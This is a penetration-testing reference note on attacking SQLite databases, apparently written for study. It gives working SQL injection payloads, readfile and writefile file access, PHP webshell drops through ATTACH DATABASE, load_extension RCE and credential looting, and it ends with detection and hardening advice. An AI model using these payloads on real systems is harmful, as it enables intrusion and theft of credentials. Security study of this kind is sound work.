# SQLite

#SQLite #database #RDBMS #embedded #fileformat

## What is SQLite?

Serverless, zero-config, **file-backed** relational database — the entire database (schema, tables, indexes, rows) lives in **one file** (`.db`, `.sqlite`, `.sqlite3`, or any extension). No daemon, no port, no network, and — the part that matters on an engagement — **no user/privilege layer at all**: access control is entirely the file's POSIX/NTFS permissions. If you can read the file you read every row; if you can write it you own the application that trusts it. It is the most widely deployed database engine in the world — browsers, mobile apps, desktop apps, and small web apps (Django / Flask / Rails dev databases) all embed it.

Two ways it shows up:
- **A file you find** after a foothold → loot creds/sessions/tokens with [[Tools/Database/sqlite3|sqlite3]].
- **The back end of a web app** → SQL injection, but in the **SQLite dialect** with a file-write→RCE path that differs from MySQL/MSSQL.

- **No network service** — nothing to port-scan; you reach it through *file access* or *an app's injection point*.
- **File signature:** the first 16 bytes are the ASCII string `SQLite format 3\000` — so any extension (or none) can be a SQLite DB.

---

## Tools

| Tool | Use |
|---|---|
| [[Tools/Database/sqlite3\|sqlite3]] | Open/query/dump a found `.db`, extract creds and browser stores |
| [[Tools/Database/SQLMap\|SQLMap]] | Automated SQLite injection (`--dbms=sqlite`) |
| [[Tools/Credential Dumping/LaZagne\|LaZagne]] | Decrypt browser credential stores (Chrome/Firefox SQLite files) |

---

## Enumeration

There's no service to fingerprint — you're finding *files*, or detecting SQLite *behind an app*.

```bash
# Find SQLite databases on a compromised host
find / \( -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' \) 2>/dev/null | grep -v /proc

# Confirm a file IS SQLite regardless of extension — check the magic bytes
file suspicious.bin
head -c 16 suspicious.bin        # -> "SQLite format 3"
```

Detect SQLite as an app's back end through an injection point (the version function is dialect-specific):

```sql
' UNION SELECT sqlite_version(),NULL-- -      -- e.g. 3.34.1  => back end is SQLite
' AND sqlite_version() IS NOT NULL-- -         -- boolean-blind confirmation
```

---

## Access

```bash
# Open a found database — full CLI reference in the tool note
sqlite3 found.db ".tables"
```

> [!warning] **A `.db` under the web root is a full-database download — no injection needed.** If the SQLite file sits below the document root and isn't blocked, `curl https://target/database.db -o loot.db` hands you every credential directly. Always try the common names: `database.db`, `db.sqlite3` (Django), `app.db`, `data.sqlite`, `database.sqlite`.

---

## Attack Vectors

### Loot a found database

Creds, session tokens, API keys, browser stores. Full CLI + browser-credential file locations are in [[Tools/Database/sqlite3\|sqlite3]]. The two commands you always run:

```sql
SELECT name, sql FROM sqlite_master WHERE type='table';   -- schema (SQLite's information_schema)
SELECT * FROM users;
```

> [!tip] **Grab the sidecar files too, and recover deleted rows.** A live DB in WAL mode has `found.db-wal` and `found.db-shm` next to it holding **committed-but-not-yet-checkpointed** writes — copy all three or you miss recent data. Deleted rows often survive in freelist pages: `sqlite3 found.db .recover` reconstructs droppable/deleted content, and a raw `strings found.db` frequently coughs up deleted creds the tables no longer show.

> [!warning] **"File is not a database" → likely SQLCipher.** Mobile/desktop apps (Signal, many password managers) store data in **SQLCipher** — whole-file AES encryption, so the `SQLite format 3` header is *absent* and `sqlite3` refuses to open it. It's not corrupt; you need the key, which is frequently hardcoded in the app binary, in a keystore/config, or derived from a device value. Open with `sqlcipher` + `PRAGMA key='...';` once you have it.

### SQL injection — the SQLite dialect

Copied MySQL/MSSQL payloads break on SQLite in specific ways — this table is the difference:

| Need | SQLite |
|---|---|
| Comment | `--` or `/* */` — **not** `#` (that's MySQL) |
| String concat | `'a' || 'b'` — no `CONCAT()` before v3.44 |
| Version | `sqlite_version()` |
| Enumerate tables | `SELECT name, sql FROM sqlite_master WHERE type='table'` (aliased `sqlite_schema` since 3.33) |
| List columns | parse the `sql` column of `sqlite_master`, or `PRAGMA table_info(t)` |
| Blind primitives | `substr(x,i,1)`, `unicode()`, `hex()`, `length()` |

```sql
-- UNION extraction (match the column count first, pad with NULLs)
' UNION SELECT name, sql, NULL FROM sqlite_master WHERE type='table'-- -
' UNION SELECT username, password, NULL FROM users-- -
```

> [!note] **File read/write/RCE is *context-dependent*, not absent.** SQLite's **core** SQL has no file-read (unlike MySQL `LOAD_FILE` / PostgreSQL `pg_read_file`), so against a hardened **application driver** (PHP PDO, Python `sqlite3`) — where `load_extension()` is disabled and the `fileio` extension isn't loaded — injection is mostly data-exfil plus the `ATTACH` write path below. But that "no file read" line collapses the moment you're in a context that has the `fileio` extension or `load_extension` enabled (see next section). Full dialect handling: [[Class notes/HTB Academy/CPTS v2 (claude)/SQL Injection|SQL Injection]].

### File read / write / RCE — `readfile` / `writefile` / `load_extension`

The primitives most notes wrongly say SQLite "doesn't have." They live in the **`fileio` extension**, which is **compiled into the `sqlite3` CLI shell by default** — verified on 3.53.4 — and can be loaded by any app that enables it. `load_extension()` is likewise **enabled in the CLI** (disabled only in the C API / language-driver defaults).

```sql
-- Arbitrary file READ (fileio ext / CLI shell)
SELECT readfile('/etc/passwd');

-- Arbitrary file WRITE — one statement, no stacked-query requirement (unlike ATTACH)
SELECT writefile('/var/www/html/sh.php', '<?php system($_GET[0]); ?>');

-- RCE via a malicious shared library: writefile the .so, then load it.
-- The .so's sqlite3_<name>_init entry point runs on load = code execution.
SELECT writefile('/tmp/e.so', readfile('/tmp/local-evil.so'));
SELECT load_extension('/tmp/e.so');
```

> [!tip] **When do you actually have these?** (1) Looting a found DB via the `sqlite3` CLI — you have all three, so a found DB on a writable host is a file-write/RCE pivot, not just a data dump. (2) An app that called `enable_load_extension(True)` or loaded `fileio` (rare but happens in data-processing apps). (3) **Not** in default PDO/python-driver injection — there, fall back to `ATTACH` below. Check with `SELECT readfile('/etc/hostname');` before relying on it.

### RCE — `ATTACH DATABASE` writes a webshell

The classic SQLite-injection-to-RCE. `ATTACH DATABASE` **creates a new SQLite file at an attacker-chosen path**; fill a text column with PHP and you've dropped a webshell — PHP ignores the binary SQLite header and executes the `<?php … ?>` inside it.

```sql
ATTACH DATABASE '/var/www/html/sh.php' AS sh;
CREATE TABLE sh.p (x TEXT);
INSERT INTO sh.p (x) VALUES ('<?php system($_GET[0]); ?>');
```

> [!warning] **Conditions — this needs stacked queries.** Many SQLite bindings (PHP PDO's default `prepare/execute`, Python's `sqlite3.execute()`) run **one statement per call**, which blocks the three-statement `ATTACH`/`CREATE`/`INSERT` chain — it needs a multi-statement `exec()`/`executescript()` context. You also need the web/DB user to be able to **write the target path**. Collect at `/sh.php?0=id`. (`$_GET[0]` — a numeric key — sidesteps the PHP 8 fatal on a bare `$_GET[cmd]`.)

### Write access → app takeover

If you can write the file directly (world-writable `.db`, or via the ATTACH RCE above), rewrite the app's own auth instead of cracking it:

```sql
UPDATE users SET is_admin = 1 WHERE username = 'you';
INSERT INTO users (username, password, role) VALUES ('x', '<hash>', 'admin');
```

---

## Detection & Artefacts

- **The `ATTACH`/`writefile` webshell is a file with the `SQLite format 3` header (or a hybrid PHP+SQLite blob) in the web root** — grepping the docroot for the magic bytes finds dropped shells. `writefile()` output has no SQLite header, so a `.php` that is valid PHP but not valid SQLite is the tell.
- **`readfile`/`writefile`/`load_extension` in query logs or app error logs** are abnormal for an app that only does CRUD — a strong IOC of injection abuse.
- **A new `.so` in `/tmp` immediately followed by a `load_extension` call** is the RCE signature.
- Defensively: serve `.db`/`.sqlite*` with a deny rule, keep DB files outside the web root, run the app driver with `load_extension` disabled (the default) and never load `fileio`, store secrets hashed.

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| `.db` under the web root, downloadable | Whole database exfiltrated over HTTP — no injection required |
| World-readable `.db` (`0644` in a shared dir) | Any local user reads every stored credential |
| World-writable / app-writable `.db` | Auth bypass by editing rows; `ATTACH`-write RCE |
| `load_extension()` enabled in the app | Injection → arbitrary `.so` load → RCE |
| `fileio` extension loaded (or CLI context) | `readfile`/`writefile` → single-statement file read + write, no stacked queries needed |
| WAL sidecars (`-wal`/`-shm`) left world-readable | Recent uncheckpointed writes + deleted rows exposed |
| Secrets stored plaintext / weak hash | SQLite has no column encryption — the row *is* the plaintext to whoever reads the file |

---

## Quick Reference

| Goal | Command |
|---|---|
| Confirm a file is SQLite | `head -c 16 file` → `SQLite format 3` |
| Find DBs on a host | `find / \( -name '*.sqlite*' -o -name '*.db' \) 2>/dev/null` |
| Download an exposed DB | `curl https://target/database.db -o loot.db` |
| List tables (CLI) | `sqlite3 f.db .tables` |
| List tables (SQLi) | `SELECT name FROM sqlite_master WHERE type='table'` |
| Detect back end via SQLi | `UNION SELECT sqlite_version()` |
| Dump schema | `SELECT name, sql FROM sqlite_master` |
| Recover deleted rows | `sqlite3 found.db .recover` / `strings found.db` |
| File read (fileio/CLI) | `SELECT readfile('/etc/passwd')` |
| File write (fileio/CLI) | `SELECT writefile('/var/www/html/sh.php','<?php system($_GET[0]);?>')` |
| RCE via extension | `SELECT load_extension('/tmp/e.so')` |
| Injection → webshell (driver) | `ATTACH DATABASE '/var/www/html/sh.php' AS s; CREATE TABLE s.p(x); INSERT INTO s.p VALUES('<?php system($_GET[0]);?>')` |

> [!note] **See also** — [[Exploits/find_sqlite|find_sqlite.sh]] (custom tool: locate every SQLite DB on a foothold by magic bytes, incl. unnamed ones), [[Tools/Database/sqlite3|sqlite3]].

---

*Created: 2026-08-20*
*Updated: 2026-09-22*
*Model: claude-opus-4-8*
